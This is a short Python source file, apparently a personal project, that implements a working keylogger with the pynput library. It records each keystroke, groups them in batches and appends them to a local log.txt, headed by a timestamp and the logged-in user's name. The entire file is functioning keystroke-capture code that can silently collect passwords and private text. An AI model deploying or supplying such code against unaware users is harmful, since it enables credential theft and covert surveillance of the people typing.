## Author: Macauley Scullion
## Last edited: 12/05/20

##------------------------Info-----------------------------

## Double hashtags represent formal comments
# Single hashtags represent removable code, either for removal or additional functionality

##---------------------------------------------------------

## Imports
from pynput.keyboard import Key, Listener
import datetime 
import getpass
import glob

## Variables: Array, Int, Dict
keys = []
count = 0
actions = {
    "Key.enter": '\n',
    "Key.space": ' ',
    "Key.shift": '',
    "Key.shift_r": '',
    "Key.backspace": '*DelChar*'
}

## On press function, utilised to append keys into an array, increasing the count so that resources are not spent on every key press
def on_press(key):
    global keys, count
    try:
        keys.append(actions[str(key)])
    except:
        keys.append(key)
    count += 1

    if count >= 5 :
        count = 0
        write_file(keys)
        keys = []

## Write file function, utilised to append to the log file while replacing any commas within the text
def write_file(keys):
    with open("log.txt", 'a') as f:
        for key in keys:
                f.write(str(key).replace("'", ""))
## Main function, creating the listener for keystrokes and with that opens the text file and initalises it with the data and the user using it
def main():
    with Listener(on_press=on_press) as listener:
        with open("log.txt", 'a') as f:
            f.write("\n\nLog datatime: {d} \nCurrent user: {u} \n\n".format(d=datetime.datetime.now(), u=getpass.getuser()))
        listener.join()

## Check the name variable, if main it will run the main code otherwise it will not
if __name__ == "__main__":
    main()